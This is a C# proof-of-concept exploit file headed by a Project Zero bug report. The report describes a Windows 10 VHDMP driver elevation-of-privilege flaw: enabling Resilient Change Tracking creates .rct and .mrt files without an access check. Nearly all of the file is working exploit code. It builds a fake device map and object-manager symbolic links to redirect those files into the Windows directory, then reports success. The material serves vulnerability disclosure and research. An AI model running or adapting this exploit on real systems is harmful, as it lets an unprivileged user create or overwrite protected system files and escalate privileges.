/*
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=914

Windows: VHDMP Arbitrary File Creation EoP
Platform: Windows 10 10586 and 14393. Unlikely to work on 7 or 8.1 as I think it’s new functionality
Class: Elevation of Privilege

Summary:
The VHDMP driver doesn’t safely create files related to Resilient Change Tracking leading to arbitrary file overwrites under user control leading to EoP.

Description:

The VHDMP driver is used to mount VHD and ISO files so that they can be accessed as a normal mounted volume. In Windows 10 support was introduced for Resilient Change Tracking which adds a few new files ending with .rct and .mrt next to the root vhd. When you enable RCT on an existing VHD it creates the files if they’re not already present. Unfortunately it does it using ZwCreateFile (in VhdmpiCreateFileWithSameSecurity) and doesn’t specify the OBJ_FORCE_ACCESS_CHECK flag. As the location is entirely controlled by the user we can exploit this to get an arbitrary file create/overwrite, and the code as its name suggests will copy across the DACL from the parent VHD meaning we’ll always be able to access it.

Note this doesn’t need admin rights as we never mount the VHD, just set RCT. However you can’t use it in a sandbox as opening the drive goes through multiple access checks.

Proof of Concept:

I’ve provided a PoC as a C# source code file. You need to compile with .NET 4 or higher. Note you must compile as Any CPU or at least the correct bitness for the system under test other setting the dos devices directory has a habit of failing. It will create abc.txt and xyz.txt inside the Windows directory which we normally can’t write to.

1) Compile the C# source code file.
2) Execute the poc passing the path
3) It should print that it successfully created a file

Expected Result:
Setting RCT fails.

Observed Result:
The user has created the files \Windows\abc.txt and \Windows\xyz.txt with a valid DACL for the user to modify the files. 
*/

using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Text;
using System.Linq;

namespace DfscTest
{
    class Program
    {
        [Flags]
        public enum AttributeFlags : uint
        {
            None = 0,
            Inherit = 0x00000002,
            Permanent = 0x00000010,
            Exclusive = 0x00000020,
            CaseInsensitive = 0x00000040,
            OpenIf = 0x00000080,
            OpenLink = 0x00000100,
            KernelHandle = 0x00000200,
            ForceAccessCheck = 0x00000400,
            IgnoreImpersonatedDevicemap = 0x00000800,
            DontReparse = 0x00001000,
        }

        public class IoStatus
        {
            public IntPtr Pointer;
            public IntPtr Information;

            public IoStatus()
            {
            }

            public IoStatus(IntPtr p, IntPtr i)
            {
                Pointer = p;
                Information = i;
            }
        }

        [Flags]
        public enum ShareMode
        {
            None = 0,
            Read = 0x00000001,
            Write = 0x00000002,
            Delete = 0x00000004,
        }

        [Flags]
        public enum FileOpenOptions
        {
            None = 0,
            DirectoryFile = 0x00000001,
            WriteThrough = 0x00000002,
            SequentialOnly = 0x00000004,
            NoIntermediateBuffering = 0x00000008,
            SynchronousIoAlert = 0x00000010,
            SynchronousIoNonAlert = 0x00000020,
            NonDirectoryFile = 0x00000040,
            CreateTreeConnection = 0x00000080,
            CompleteIfOplocked = 0x00000100,
            NoEaKnowledge = 0x00000200,
            OpenRemoteInstance = 0x00000400,
            RandomAccess = 0x00000800,
            DeleteOnClose = 0x00001000,
            OpenByFileId = 0x00002000,
            OpenForBackupIntent = 0x00004000,
            NoCompression = 0x00008000,
            OpenRequiringOplock = 0x00010000,
            ReserveOpfilter = 0x00100000,
            OpenReparsePoint = 0x00200000,
            OpenNoRecall = 0x00400000,
            OpenForFreeSpaceQuery = 0x00800000
        }

        [Flags]
        public enum GenericAccessRights : uint
        {
            None = 0,
            GenericRead = 0x80000000,
            GenericWrite = 0x40000000,
            GenericExecute = 0x20000000,
            GenericAll = 0x10000000,
            Delete = 0x00010000,
            ReadControl = 0x00020000,
            WriteDac = 0x00040000,
            WriteOwner = 0x00080000,
            Synchronize = 0x00100000,
            MaximumAllowed = 0x02000000,
        };


        [Flags]
        enum DirectoryAccessRights : uint
        {
            Query = 1,
            Traverse = 2,
            CreateObject = 4,
            CreateSubDirectory = 8,
            GenericRead = 0x80000000,
            GenericWrite = 0x40000000,
            GenericExecute = 0x20000000,
            GenericAll = 0x10000000,
            Delete = 0x00010000,
            ReadControl = 0x00020000,
            WriteDac = 0x00040000,
            WriteOwner = 0x00080000,
            Synchronize = 0x00100000,
            MaximumAllowed = 0x02000000,
        }

        [Flags]
        public enum ProcessAccessRights : uint
        {
            None = 0,
            CreateProcess = 0x0080,
            CreateThread = 0x0002,
            DupHandle = 0x0040,
            QueryInformation = 0x0400,
            QueryLimitedInformation = 0x1000,
            SetInformation = 0x0200,
            SetQuota = 0x0100,
            SuspendResume = 0x0800,
            Terminate = 0x0001,
            VmOperation = 0x0008,
            VmRead = 0x0010,
            VmWrite = 0x0020,
            MaximumAllowed = GenericAccessRights.MaximumAllowed
        };

        [Flags]
        public enum FileAccessRights : uint
        {
            None = 0,
            ReadData = 0x0001,
            WriteData = 0x0002,
            AppendData = 0x0004,
            ReadEa = 0x0008,
            WriteEa = 0x0010,
            Execute = 0x0020,
            DeleteChild = 0x0040,
            ReadAttributes = 0x0080,
            WriteAttributes = 0x0100,
            GenericRead = 0x80000000,
            GenericWrite = 0x40000000,
            GenericExecute = 0x20000000,
            GenericAll = 0x10000000,
            Delete = 0x00010000,
            ReadControl = 0x00020000,
            WriteDac = 0x00040000,
            WriteOwner = 0x00080000,
            Synchronize = 0x00100000,
            MaximumAllowed = 0x02000000,
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public sealed class UnicodeString
        {
            ushort Length;
            ushort MaximumLength;
            [MarshalAs(UnmanagedType.LPWStr)]
            string Buffer;

            public UnicodeString(string str)
            {
                Length = (ushort)(str.Length * 2);
                MaximumLength = (ushort)((str.Length * 2) + 1);
                Buffer = str;
            }
        }

        [DllImport("ntdll.dll")]
        static extern int NtClose(IntPtr handle);

        public sealed class SafeKernelObjectHandle
          : SafeHandleZeroOrMinusOneIsInvalid
        {
            public SafeKernelObjectHandle()
              : base(true)
            {
            }

            public SafeKernelObjectHandle(IntPtr handle, bool owns_handle)
              : base(owns_handle)
            {
                SetHandle(handle);
            }

            protected override bool ReleaseHandle()
            {
                if (!IsInvalid)
                {
                    NtClose(this.handle);
                    this.handle = IntPtr.Zero;
                    return true;
                }
                return false;
            }
        }

        public enum SecurityImpersonationLevel
        {
            Anonymous = 0,
            Identification = 1,
            Impersonation = 2,
            Delegation = 3
        }

        public enum SecurityContextTrackingMode : byte
        {
            Static = 0,
            Dynamic = 1
        }

        [StructLayout(LayoutKind.Sequential)]
        public sealed class SecurityQualityOfService
        {
            int Length;
            public SecurityImpersonationLevel ImpersonationLevel;
            public SecurityContextTrackingMode ContextTrackingMode;
            [MarshalAs(UnmanagedType.U1)]
            public bool EffectiveOnly;

            public SecurityQualityOfService()
            {
                Length = Marshal.SizeOf(this);
            }
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public sealed class ObjectAttributes : IDisposable
        {
            int Length;
            IntPtr RootDirectory;
            IntPtr ObjectName;
            AttributeFlags Attributes;
            IntPtr SecurityDescriptor;
            IntPtr SecurityQualityOfService;

            private static IntPtr AllocStruct(object s)
            {
                int size = Marshal.SizeOf(s);
                IntPtr ret = Marshal.AllocHGlobal(size);
                Marshal.StructureToPtr(s, ret, false);
                return ret;
            }

            private static void FreeStruct(ref IntPtr p, Type struct_type)
            {
                Marshal.DestroyStructure(p, struct_type);
                Marshal.FreeHGlobal(p);
                p = IntPtr.Zero;
            }

            public ObjectAttributes() : this(AttributeFlags.None)
            {
            }

            public ObjectAttributes(string object_name, AttributeFlags attributes) : this(object_name, attributes, null, null, null)
            {
            }

            public ObjectAttributes(AttributeFlags attributes) : this(null, attributes, null, null, null)
            {
            }

            public ObjectAttributes(string object_name) : this(object_name, AttributeFlags.CaseInsensitive, null, null, null)
            {
            }

            public ObjectAttributes(string object_name, AttributeFlags attributes, SafeKernelObjectHandle root, SecurityQualityOfService sqos, GenericSecurityDescriptor security_descriptor)
            {
                Length = Marshal.SizeOf(this);
                if (object_name != null)
                {
                    ObjectName = AllocStruct(new UnicodeString(object_name));
                }
                Attributes = attributes;
                if (sqos != null)
                {
                    SecurityQualityOfService = AllocStruct(sqos);
                }
                if (root != null)
                    RootDirectory = root.DangerousGetHandle();
                if (security_descriptor != null)
                {
                    byte[] sd_binary = new byte[security_descriptor.BinaryLength];
                    security_descriptor.GetBinaryForm(sd_binary, 0);
                    SecurityDescriptor = Marshal.AllocHGlobal(sd_binary.Length);
                    Marshal.Copy(sd_binary, 0, SecurityDescriptor, sd_binary.Length);
                }
            }

            public void Dispose()
            {
                if (ObjectName != IntPtr.Zero)
                {
                    FreeStruct(ref ObjectName, typeof(UnicodeString));
                }
                if (SecurityQualityOfService != IntPtr.Zero)
                {
                    FreeStruct(ref SecurityQualityOfService, typeof(SecurityQualityOfService));
                }
                if (SecurityDescriptor != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(SecurityDescriptor);
                    SecurityDescriptor = IntPtr.Zero;
                }
                GC.SuppressFinalize(this);
            }

            ~ObjectAttributes()
            {
                Dispose();
            }
        }

        [DllImport("ntdll.dll")]
        public static extern int NtOpenFile(
            out IntPtr FileHandle,
            FileAccessRights DesiredAccess,
            ObjectAttributes ObjAttr,
            [In] [Out] IoStatus IoStatusBlock,
            ShareMode ShareAccess,
            FileOpenOptions OpenOptions);

        public static void StatusToNtException(int status)
        {
            if (status < 0)
            {
                throw new NtException(status);
            }
        }

        public class NtException : ExternalException
        {
            [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
            private static extern IntPtr GetModuleHandle(string modulename);

            [Flags]
            enum FormatFlags
            {
                AllocateBuffer = 0x00000100,
                FromHModule = 0x00000800,
                FromSystem = 0x00001000,
                IgnoreInserts = 0x00000200
            }

            [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
            private static extern int FormatMessage(
              FormatFlags dwFlags,
              IntPtr lpSource,
              int dwMessageId,
              int dwLanguageId,
              out IntPtr lpBuffer,
              int nSize,
              IntPtr Arguments
            );

            [DllImport("kernel32.dll")]
            private static extern IntPtr LocalFree(IntPtr p);

            private static string StatusToString(int status)
            {
                IntPtr buffer = IntPtr.Zero;
                try
                {
                    if (FormatMessage(FormatFlags.AllocateBuffer | FormatFlags.FromHModule | FormatFlags.FromSystem | FormatFlags.IgnoreInserts,
                        GetModuleHandle("ntdll.dll"), status, 0, out buffer, 0, IntPtr.Zero) > 0)
                    {
                        return Marshal.PtrToStringUni(buffer);
                    }
                }
                finally
                {
                    if (buffer != IntPtr.Zero)
                    {
                        LocalFree(buffer);
                    }
                }
                return String.Format("Unknown Error: 0x{0:X08}", status);
            }

            public NtException(int status) : base(StatusToString(status))
            {
            }
        }

        public class SafeHGlobalBuffer : SafeHandleZeroOrMinusOneIsInvalid
        {
            public SafeHGlobalBuffer(int length)
              : this(Marshal.AllocHGlobal(length), length, true)
            {
            }

            public SafeHGlobalBuffer(IntPtr buffer, int length, bool owns_handle)
              : base(owns_handle)
            {
                Length = length;
                SetHandle(buffer);
            }

            public int Length
            {
                get; private set;
            }

            protected override bool ReleaseHandle()
            {
                if (!IsInvalid)
                {
                    Marshal.FreeHGlobal(handle);
                    handle = IntPtr.Zero;
                }
                return true;
            }
        }

        public class SafeStructureBuffer : SafeHGlobalBuffer
        {
            Type _type;

            public SafeStructureBuffer(object value) : base(Marshal.SizeOf(value))
            {
                _type = value.GetType();
                Marshal.StructureToPtr(value, handle, false);
            }

            protected override bool ReleaseHandle()
            {
                if (!IsInvalid)
                {
                    Marshal.DestroyStructure(handle, _type);
                }
                return base.ReleaseHandle();
            }
        }

        public class SafeStructureOutBuffer<T> : SafeHGlobalBuffer
        {
            public SafeStructureOutBuffer() : base(Marshal.SizeOf(typeof(T)))
            {
            }

            public T Result
            {
                get
                {
                    if (IsInvalid)
                        throw new ObjectDisposedException("handle");

                    return Marshal.PtrToStructure<T>(handle);
                }
            }
        }

        public static SafeFileHandle OpenFile(string name, FileAccessRights DesiredAccess, ShareMode ShareAccess, FileOpenOptions OpenOptions, bool inherit)
        {
            AttributeFlags flags = AttributeFlags.CaseInsensitive;
            if (inherit)
                flags |= AttributeFlags.Inherit;
            using (ObjectAttributes obja = new ObjectAttributes(name, flags))
            {
                IntPtr handle;
                IoStatus iostatus = new IoStatus();
                int status = NtOpenFile(out handle, DesiredAccess, obja, iostatus, ShareAccess, OpenOptions);
                StatusToNtException(status);
                return new SafeFileHandle(handle, true);
            }
        }

        [DllImport("ntdll.dll")]
        public static extern int NtDeviceIoControlFile(
          SafeFileHandle FileHandle,
          IntPtr Event,
          IntPtr ApcRoutine,
          IntPtr ApcContext,
          [Out] IoStatus IoStatusBlock,
          uint IoControlCode,
          byte[] InputBuffer,
          int InputBufferLength,
          byte[] OutputBuffer,
          int OutputBufferLength
        );

        [DllImport("ntdll.dll")]
        public static extern int NtFsControlFile(
          SafeFileHandle FileHandle,
          IntPtr Event,
          IntPtr ApcRoutine,
          IntPtr ApcContext,
          [Out] IoStatus IoStatusBlock,
          uint FSControlCode,
          [In] byte[] InputBuffer,
          int InputBufferLength,
          [Out] byte[] OutputBuffer,
          int OutputBufferLength
        );

        [DllImport("ntdll.dll")]
        static extern int NtCreateDirectoryObject(out IntPtr Handle, DirectoryAccessRights DesiredAccess, ObjectAttributes ObjectAttributes);

        [DllImport("ntdll.dll")]
        static extern int NtOpenDirectoryObject(out IntPtr Handle, DirectoryAccessRights DesiredAccess, ObjectAttributes ObjectAttributes);

        const int ProcessDeviceMap = 23;

        [DllImport("ntdll.dll")]
        static extern int NtSetInformationProcess(
            IntPtr ProcessHandle,
            int ProcessInformationClass,
            byte[] ProcessInformation,
            int ProcessInformationLength);

        static byte[] StructToBytes(object o)
        {
            int size = Marshal.SizeOf(o);
            IntPtr p = Marshal.AllocHGlobal(size);
            try
            {
                Marshal.StructureToPtr(o, p, false);
                byte[] ret = new byte[size];
                Marshal.Copy(p, ret, 0, size);
                return ret;
            }
            finally
            {
                if (p != IntPtr.Zero)
                    Marshal.FreeHGlobal(p);
            }
        }

        static byte[] GetBytes(string s)
        {
            return Encoding.Unicode.GetBytes(s + "\0");
        }

        static SafeKernelObjectHandle CreateDirectory(SafeKernelObjectHandle root, string path)
        {
            using (ObjectAttributes obja = new ObjectAttributes(path, AttributeFlags.CaseInsensitive, root, null, null))
            {
                IntPtr handle;
                StatusToNtException(NtCreateDirectoryObject(out handle, DirectoryAccessRights.GenericAll, obja));
                return new SafeKernelObjectHandle(handle, true);
            }
        }

        static SafeKernelObjectHandle OpenDirectory(string path)
        {
            using (ObjectAttributes obja = new ObjectAttributes(path, AttributeFlags.CaseInsensitive))
            {
                IntPtr handle;
                StatusToNtException(NtOpenDirectoryObject(out handle, DirectoryAccessRights.MaximumAllowed, obja));
                return new SafeKernelObjectHandle(handle, true);
            }
        }

        [DllImport("ntdll.dll")]
        static extern int NtCreateSymbolicLinkObject(
            out IntPtr LinkHandle,
            GenericAccessRights DesiredAccess,
            ObjectAttributes ObjectAttributes,
            UnicodeString DestinationName
        );

        static SafeKernelObjectHandle CreateSymbolicLink(SafeKernelObjectHandle directory, string path, string target)
        {
            using (ObjectAttributes obja = new ObjectAttributes(path, AttributeFlags.CaseInsensitive, directory, null, null))
            {
                IntPtr handle;
                StatusToNtException(NtCreateSymbolicLinkObject(out handle, GenericAccessRights.MaximumAllowed, obja, new UnicodeString(target)));
                return new SafeKernelObjectHandle(handle, true);
            }
        }

        static void SetDosDirectory(SafeKernelObjectHandle directory)
        {
            IntPtr p = directory.DangerousGetHandle();
            byte[] data = null;
            if (IntPtr.Size == 4)
            {
                data = BitConverter.GetBytes(p.ToInt32());
            }
            else
            {
                data = BitConverter.GetBytes(p.ToInt64());
            }

            StatusToNtException(NtSetInformationProcess(new IntPtr(-1), ProcessDeviceMap, data, data.Length));
        }

        enum StorageDeviceType
        {
            Unknown = 0,
            Iso = 1,
            Vhd = 2,
            Vhdx = 3,
            VhdSet = 4,
        }

        [StructLayout(LayoutKind.Sequential)]
        struct VirtualStorageType
        {
            public StorageDeviceType DeviceId;
            public Guid VendorId;
        }

        enum OpenVirtualDiskFlag
        {
            None = 0,
            NoParents = 1,
            BlankFile = 2,
            BootDrive = 4,
            CachedIo = 8,
            DiffChain = 0x10,
            ParentcachedIo = 0x20,
            VhdSetFileOnly = 0x40,
        }

        enum CreateVirtualDiskVersion
        {
            Unspecified = 0,
            Version1 = 1,
            Version2 = 2,
            Version3 = 3,
        }
            
        [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
        struct CreateVirtualDiskParameters
        {
            public CreateVirtualDiskVersion Version;
            public Guid UniqueId;
            public ulong MaximumSize;
            public uint BlockSizeInBytes;
            public uint SectorSizeInBytes;
            public uint PhysicalSectorSizeInBytes;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string ParentPath;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string SourcePath;
            // Version 2 on
            public OpenVirtualDiskFlag OpenFlags;
            public VirtualStorageType ParentVirtualStorageType;
            public VirtualStorageType SourceVirtualStorageType;
            public Guid ResiliencyGuid;
            // Version 3 on
            [MarshalAs(UnmanagedType.LPWStr)]
            public string SourceLimitPath;
            public VirtualStorageType BackingStorageType;
        }

        enum VirtualDiskAccessMask
        {
            None = 0,
            AttachRo = 0x00010000,
            AttachRw = 0x00020000,
            Detach = 0x00040000,
            GetInfo = 0x00080000,
            Create = 0x00100000,
            MetaOps = 0x00200000,
            Read = 0x000d0000,
            All = 0x003f0000
        }

        enum CreateVirtualDiskFlag
        {
            None = 0x0,
            FullPhysicalAllocation = 0x1,
            PreventWritesToSourceDisk = 0x2,
            DoNotcopyMetadataFromParent = 0x4,
            CreateBackingStorage = 0x8,
            UseChangeTrackingSourceLimit = 0x10,
            PreserveParentChangeTrackingState = 0x20,
        }        

        [DllImport("virtdisk.dll", CharSet=CharSet.Unicode)]
        static extern int CreateVirtualDisk(
            [In] ref VirtualStorageType VirtualStorageType,
            string Path,
            VirtualDiskAccessMask        VirtualDiskAccessMask,
            [In] byte[] SecurityDescriptor,
            CreateVirtualDiskFlag        Flags,
            uint ProviderSpecificFlags,
            [In] ref CreateVirtualDiskParameters Parameters,
            IntPtr  Overlapped,
            out IntPtr Handle
        );

        static Guid GUID_DEVINTERFACE_SURFACE_VIRTUAL_DRIVE = new Guid("2E34D650-5819-42CA-84AE-D30803BAE505");
        static Guid VIRTUAL_STORAGE_TYPE_VENDOR_MICROSOFT = new Guid("EC984AEC-A0F9-47E9-901F-71415A66345B");

        static SafeFileHandle CreateVHD(string path)
        {
            VirtualStorageType vhd_type = new VirtualStorageType();
            vhd_type.DeviceId = StorageDeviceType.Vhd;
            vhd_type.VendorId = VIRTUAL_STORAGE_TYPE_VENDOR_MICROSOFT;

            CreateVirtualDiskParameters ps = new CreateVirtualDiskParameters();
            ps.Version = CreateVirtualDiskVersion.Version1;
            ps.SectorSizeInBytes = 512;
            ps.MaximumSize = 100 * 1024 * 1024;
            IntPtr hDisk;
            int error = CreateVirtualDisk(ref vhd_type, path, VirtualDiskAccessMask.All, null, CreateVirtualDiskFlag.None, 0, ref ps, IntPtr.Zero, out hDisk);
            if (error != 0)
            {
                throw new Win32Exception(error);
            }

            return new SafeFileHandle(hDisk, true);
        }

        enum SetVirtualDiskInfoVersion
        {
            Unspecified = 0,
            ParentPath = 1,
            Identified = 2,
            ParentPathWithDepth = 3,
            PhysicalSectionSize = 4,
            VirtualDiskId = 5,
            ChangeTrackingState = 6,
            ParentLocator = 7,
        }        

        [StructLayout(LayoutKind.Sequential)]
        struct SetVirtualDiskInfo
        {
            public SetVirtualDiskInfoVersion Version;
            [MarshalAs(UnmanagedType.Bool)]
            public bool ChangeTrackingEnabled;
        }

        [DllImport("virtdisk.dll", CharSet = CharSet.Unicode)]
        static extern int SetVirtualDiskInformation(
            SafeFileHandle VirtualDiskHandle,
            ref SetVirtualDiskInfo VirtualDiskInfo
        );

        static List<SafeKernelObjectHandle> CreateChainForPath(string path)
        {
            string[] parts = path.Split('\\');
            List<SafeKernelObjectHandle> ret = new List<SafeKernelObjectHandle>();
            SafeKernelObjectHandle curr = CreateDirectory(null, null);
            ret.Add(curr);
            foreach (string part in parts)
            {
                curr = CreateDirectory(curr, part);
                ret.Add(curr);
            }

            return ret;
        }
        

        static void Main(string[] args)
        {
            try
            {
                string vhd_path = Path.GetFullPath("test.vhd");
                File.Delete(vhd_path);
                File.Delete(vhd_path + ".rct");
                File.Delete(vhd_path + ".mrt");

                Console.WriteLine("[INFO]: Creating VHD {0}", vhd_path);
                
                List<SafeKernelObjectHandle> chain = CreateChainForPath(Path.GetDirectoryName(vhd_path));
                SafeKernelObjectHandle rct_symlink = CreateSymbolicLink(chain.Last(), Path.GetFileName(vhd_path) + ".rct", @"\SystemRoot\abc.txt");
                SafeKernelObjectHandle mrt_symlink = CreateSymbolicLink(chain.Last(), Path.GetFileName(vhd_path) + ".mrt", @"\SystemRoot\xyz.txt");

                using (SafeFileHandle handle = CreateVHD(vhd_path))
                {
                    // Write dummy files for when the kernel impersonates us (and kills the per-process device map)
                    File.WriteAllBytes(vhd_path + ".rct", new byte[0]);
                    File.WriteAllBytes(vhd_path + ".mrt", new byte[0]);
                    SetVirtualDiskInfo disk_info = new SetVirtualDiskInfo();
                    disk_info.Version = SetVirtualDiskInfoVersion.ChangeTrackingState;
                    disk_info.ChangeTrackingEnabled = true;
                    SetDosDirectory(chain.First());
                    int error = SetVirtualDiskInformation(handle, ref disk_info);
                    chain[1].Close();
                    if (error != 0)
                    {
                        throw new Win32Exception(error);
                    }
                }

                if (!File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "abc.txt")))
                {
                    Console.WriteLine("[ERROR]: Didn't create arbitrary file");
                }
                else
                {
                    Console.WriteLine("[SUCCESS]: Created arbitary file");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[ERROR]: {0}", ex.Message);
            }
        }
    }
}
